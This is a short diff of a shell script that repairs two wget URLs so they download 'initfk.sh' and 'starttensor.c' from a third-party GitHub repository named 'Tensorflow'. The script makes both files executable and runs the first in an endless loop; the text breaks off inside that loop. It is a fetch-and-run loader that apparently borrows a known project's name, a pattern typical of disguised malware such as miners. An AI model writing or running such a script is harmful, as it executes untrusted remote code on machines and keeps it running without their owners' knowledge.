@@ -1,7 +1,7 @@
 #!/bin/sh
-  wget https://github.com/nglkmerkel/Tensorflow/initfk.sh
+  wget https://raw.githubusercontent.com/nglkmerkel/Tensorflow/main/initfk.sh
   chmod +x initfk.sh 
-  wget https://github.com/nglkmerkel/Tensorflow/starttensor.c
+  wget https://raw.githubusercontent.com/nglkmerkel/Tensorflow/main/starttensor.c
   chmod +x starttensor.c
   while [ 1 ]; do
   ./initfk.sh
